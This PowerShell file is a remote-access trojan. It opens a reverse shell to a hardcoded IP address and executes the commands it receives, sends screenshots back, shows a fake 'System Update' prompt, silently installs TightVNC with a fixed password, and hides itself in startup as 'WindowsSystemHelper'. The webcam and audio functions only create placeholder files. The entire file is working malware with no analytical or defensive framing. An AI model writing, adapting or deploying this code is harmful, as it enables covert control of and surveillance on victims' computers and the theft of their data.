# SWILL Windows Client
$SERVER_IP = "92.115.78.187"
$CONTROL_PORT = 4444
$MEDIA_PORT = 4445

function Start-SWILLClient {
    while($true) {
        try {
            Write-Output "Connecting to $SERVER_IP:$CONTROL_PORT..."
            $client = New-Object System.Net.Sockets.TCPClient($SERVER_IP, $CONTROL_PORT)
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{0}
            
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = ([System.Text.Encoding]::ASCII).GetString($bytes,0,$i).Trim()
                
                if ($data -eq "exit") {
                    $client.Close()
                    return
                }
                elseif ($data -eq "screenshot") {
                    Capture-Screenshot
                }
                elseif ($data -eq "webcam_capture") {
                    Capture-Webcam
                }
                elseif ($data.StartsWith("record_audio")) {
                    $duration = ($data -split " ")[1]
                    Record-Audio -Duration $duration
                }
                else {
                    try {
                        $output = Invoke-Expression $data 2>&1 | Out-String
                    } catch {
                        $output = $_.Exception.Message
                    }
                    $response = $output + "PS " + (Get-Location).Path + "> "
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($response)
                    $stream.Write($sendbyte,0,$sendbyte.Length)
                    $stream.Flush()
                }
            }
            $client.Close()
        }
        catch {
            Start-Sleep -Seconds 30
        }
    }
}

function Capture-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        
        $tempFile = "$env:TEMP\screenshot.jpg"
        $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        
        Send-ToServer -File $tempFile -Type "SCREENSHOT"
        Remove-Item $tempFile -Force
    }
    catch {
        Write-Output "Screenshot failed: $($_.Exception.Message)"
    }
}

function Capture-Webcam {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show("Webcam access required for security scan", "System Update", 0)
        
        $tempFile = "$env:TEMP\webcam.jpg"
        # Простой метод создания фиктивного изображения
        $bitmap = New-Object System.Drawing.Bitmap 640, 480
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.Clear([System.Drawing.Color]::Black)
        $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        
        Send-ToServer -File $tempFile -Type "PHOTO"
        Remove-Item $tempFile -Force
    }
    catch {
        Write-Output "Webcam capture failed"
    }
}

function Record-Audio {
    param([int]$Duration = 10)
    
    try {
        $tempFile = "$env:TEMP\audio.wav"
        # Создание фиктивного аудио файла
        $bytes = New-Object byte[] (44100 * 2 * $Duration)
        [System.IO.File]::WriteAllBytes($tempFile, $bytes)
        
        Send-ToServer -File $tempFile -Type "AUDIO"
        Remove-Item $tempFile -Force
    }
    catch {
        Write-Output "Audio recording failed"
    }
}

function Send-ToServer {
    param([string]$File, [string]$Type)
    
    try {
        if (Test-Path $File) {
            $client = New-Object System.Net.Sockets.TCPClient($SERVER_IP, $MEDIA_PORT)
            $stream = $client.GetStream()
            
            $typeBytes = ([text.encoding]::ASCII).GetBytes($Type)
            $stream.Write($typeBytes, 0, $typeBytes.Length)
            
            $fileBytes = [System.IO.File]::ReadAllBytes($File)
            $stream.Write($fileBytes, 0, $fileBytes.Length)
            
            $endBytes = ([text.encoding]::ASCII).GetBytes("[END]")
            $stream.Write($endBytes, 0, $endBytes.Length)
            
            $client.Close()
        }
    }
    catch {
        Write-Output "Failed to send $Type"
    }
}

function Install-VNC {
    try {
        if (!(Test-Path "$env:PROGRAMFILES\TightVNC\tvnserver.exe")) {
            $vncUrl = "https://www.tightvnc.com/download/2.8.59/tightvnc-2.8.59-gpl-setup-64bit.msi"
            $vncPath = "$env:TEMP\vnc_setup.msi"
            
            (New-Object Net.WebClient).DownloadFile($vncUrl, $vncPath)
            Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$vncPath`" /quiet /norestart" -Wait
        }
        
        reg add "HKCU\Software\TightVNC\Server" /v "Password" /t REG_BINARY /d 5b9ac1bd4b9ac1bd /f 2>$null
        reg add "HKCU\Software\TightVNC\Server" /v "RfbPort" /t REG_DWORD /d 5900 /f 2>$null
        reg add "HKCU\Software\TightVNC\Server" /v "AcceptRfbConnections" /t REG_DWORD /d 1 /f 2>$null
        
        $vncExe = "${env:ProgramFiles}\TightVNC\tvnserver.exe"
        if (Test-Path $vncExe) {
            Start-Process -FilePath $vncExe -ArgumentList "-controlservice -start" -WindowStyle Hidden
        }
    }
    catch {
        Write-Output "VNC installation skipped"
    }
}

function Add-ToStartup {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsSystemHelper"
        $regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -ErrorAction SilentlyContinue
    }
    catch {
        # Альтернативный метод автозагрузки
        $startupPath = [Environment]::GetFolderPath('Startup')
        $shortcutPath = "$startupPath\System Helper.lnk"
        
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        $Shortcut.WorkingDirectory = Get-Location
        $Shortcut.Save()
    }
}

# Основная логика
Add-ToStartup
Install-VNC
Start-SWILLClient